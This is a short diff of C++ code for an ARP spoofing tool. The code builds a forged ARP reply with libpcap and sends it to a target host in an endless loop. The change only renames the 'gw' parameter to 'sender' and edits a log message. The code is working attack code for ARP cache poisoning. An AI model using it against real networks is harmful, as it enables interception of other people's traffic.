@@ -94,11 +94,11 @@ HwAddr get_target_mac(const char *dev, const IpAddr &tip) {
     return HwAddr("FF:FF:FF:FF:FF:FF");
 }
 
-void arp_spoof(const char *dev, const string &gw, const string &target) {
+void arp_spoof(const char *dev, const string &sender, const string &target) {
     cout << "open device " << dev << endl;
     pcap *desc = open_dev(dev);
 
-    IpAddr sip = IpAddr(gw);
+    IpAddr sip = IpAddr(sender);
     IpAddr tip = IpAddr(target);
     HwAddr smac = get_dev_mac(dev);
     HwAddr tmac = get_target_mac(dev, tip);
@@ -106,7 +106,7 @@ void arp_spoof(const char *dev, const string &gw, const string &target) {
     ArpPacket arp = ArpPacket(ARPOP_REPLY, smac, sip, tmac, tip);
     byte *packet = (byte *) arp;
 
-    cout << "start arp spoofing" << endl;
+    cout << "start arp spoofing..." << endl;
     int i = 0;
     while (true) {
         if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
